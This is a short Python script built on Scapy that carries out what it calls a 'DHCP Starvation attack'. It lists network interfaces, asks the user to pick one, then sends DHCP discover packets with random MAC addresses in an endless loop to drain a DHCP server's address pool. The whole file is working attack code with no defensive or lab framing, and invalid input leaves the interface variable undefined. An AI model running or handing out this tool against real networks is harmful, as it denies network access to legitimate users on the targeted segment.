from scapy.all import *
import random
import psutil
import socket
from scapy.layers.dhcp import BOOTP, DHCP, IP
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether

conf.checkIPaddr = False

def list_interfaces():
    """
    List all available network interfaces using Scapy.
    """
    print("Available interfaces:")
    for index, iface in enumerate(conf.ifaces):
        print(f"Index: {index}, Name: {conf.ifaces[iface].name}")

dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff" ,src=RandMAC()) \
                        /IP(src='0.0.0.0' ,dst='255.255.255.255') \
                        /UDP(sport=68,dport=67) \
                        /BOOTP(op=1,chaddr = RandMAC()) \
                        /DHCP(options=[("message-type", "discover"), "end"])


list_interfaces()
selected_index = input("Please enter the interface index you want to use: ")

if selected_index.isdigit():
    selected_index = int(selected_index)
    if selected_index < len(conf.ifaces):
        selected_interface = list(conf.ifaces.keys())[selected_index]
        interface_name = conf.ifaces[selected_interface].name
        print(f"Using interface {interface_name} for DHCP Starvation attack.")
    else:
        print("Invalid interface index selected.")
else:
    print("Invalid input. Please enter a valid interface index.")
    
sendp(dhcp_discover,iface=interface_name,loop=1,verbose=1)
